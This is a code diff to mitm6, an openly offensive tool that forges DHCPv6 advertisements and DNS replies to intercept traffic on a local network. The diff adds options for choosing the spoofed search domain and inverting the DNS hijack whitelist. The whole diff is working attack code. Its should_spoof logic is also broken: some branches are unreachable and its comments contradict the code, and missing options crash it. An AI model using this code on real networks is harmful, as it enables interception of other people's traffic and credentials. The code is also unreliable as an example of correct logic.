@@ -61,9 +61,14 @@ class Config(object):
         self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
         self.ipv6noaddr = random.randint(1,9999)
         self.ipv6noaddrc = 1
-        self.dnsdomain = args.domain
+        self.dnsdomain=[]
+        for d in args.domain:
+            self.dnsdomain.append(d.lower())
+
+        self.localdomain = args.localdomain.lower()
         self.debug = args.debug
         self.verbose = args.verbose
+        self.invertdns = args.invertdns
         # End of config
 
 # Target class - defines the host we are targetting
@@ -105,8 +110,7 @@ def send_dhcp_advertise(p, basep, target):
     resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
     resp /= DHCP6OptServerId(duid=config.selfduid)
     resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
-    if len(config.dnsdomain) > 0:
-        resp /= DHCP6OptDNSDomains(dnsdomains=[config.dnsdomain[0]])
+    resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
     if target.ipv4 != '':
         addr = config.ipv6prefix + target.ipv4.replace('.', ':')
     else:
@@ -123,8 +127,7 @@ def send_dhcp_reply(p, basep):
     resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
     resp /= DHCP6OptServerId(duid=config.selfduid)
     resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
-    if len(config.dnsdomain) > 0:
-        resp /= DHCP6OptDNSDomains(dnsdomains=[config.dnsdomain[0]])
+    resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
     opt = p[DHCP6OptIAAddress]
     resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
     sendp(resp, verbose=False)
@@ -155,7 +158,7 @@ def send_dns_reply(p):
         return
         if reqname == config.selfptr:
             #We reply with attacker.domain
-            rdata = 'attacker.%s' % config.dnsdomain[0]
+            rdata = 'attacker.%s' % config.localdomain
         else:
             return
     #Not handled
@@ -176,12 +179,22 @@ def send_dns_reply(p):
             print('Ignored query for %s from %s' % (reqname, ip.src))
 
 def should_spoof(dnsname):
-    if config.dnsdomain == []:
+    # dnsdomain NOT empty and NOT invert == intercept all but dnsdomain
+    if config.dnsdomain and not config.invertdns:
+        if dnsname.lower() in config.dnsdomain:
+            return True
+    # dnsdomain NOT empty and invert == intercept just dnsdomain
+    elif config.dnsdomain and config.invertdns:
+        if dnsname.lower() not in config.dnsdomain:
+            return True
+    # dnsdomain empty and NOT invert == do intercept everything, prolly brokes things
+    elif config.dnsdomain and not config.invertdns:
         return True
+    # dnsdomain empty and invert == do not intercept anything, should never happen
+    elif config.dnsdomain and config.invertdns:
+        return False
     else:
-        for dnsdomain in config.dnsdomain:
-            if dnsdomain.lower() in dnsname.lower():
-                return True
+        return False
     return False
 
 def parsepacket(p, config):
@@ -244,12 +257,14 @@ def print_err(failure):
 def main():
     global config
     parser = argparse.ArgumentParser(description='mitm6 - pwning IPv4 via IPv6')
-    parser.add_argument("-d", "--domain", action='append', metavar='DOMAIN', help="Interal domain name to filter DNS queries on (Whitelist principle, multiple can be specified. Note that the first will be used as DNS search domain)")
+    parser.add_argument("-d", "--domain", action='append', metavar='DOMAIN', help="Domain name to filter DNS queries on (Whitelist principle, multiple can be specified.)")
+    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain")
     parser.add_argument("-i", "--interface", type=str, metavar='INTERFACE', help="Interface to use (default: autodetect)")
     parser.add_argument("-4", "--ipv4", type=str, metavar='ADDRESS', help="IPv4 address to send packets from (default: autodetect)")
     parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
     parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
     parser.add_argument("-a", "--no-ra", action='store_true', help="Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)")
+    parser.add_argument("-I", "--invertdns", action='store_true', help="Invert DNS whitelist principle, do intercept ONLY domains specified by -d/--domain")
     parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
     parser.add_argument("--debug", action='store_true', help="Show debug information")
 
@@ -259,11 +274,20 @@ def main():
     print('Primary adapter: %s [%s]' % (config.default_if, config.selfmac))
     print('IPv4 address: %s' % config.selfipv4)
     print('IPv6 address: %s' % config.selfaddr)
-    if config.dnsdomain is None:
-        print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify a domain with -d')
+    if len(config.dnsdomain)<1:
+        if not args.invertdns:
+            print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify a domain with -d')
+        else:
+            print('Warning: Filtering on any domain, mitm6 will not reply to any DNS queries.\nUnless this is what you want, specify a domain with -d')
         config.dnsdomain = []
     else:
-        print('DNS domains: %s' % ', '.join(config.dnsdomain))
+        if args.invertdns:
+            print('Ignoring ',end="")
+        else:
+            print('Replying to',end="")
+        print(' DNS domains:')
+        print(config.dnsdomain)
+
 
     #Main packet capture thread
     d = threads.deferToThread(sniff, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x, config), stop_filter=should_stop)
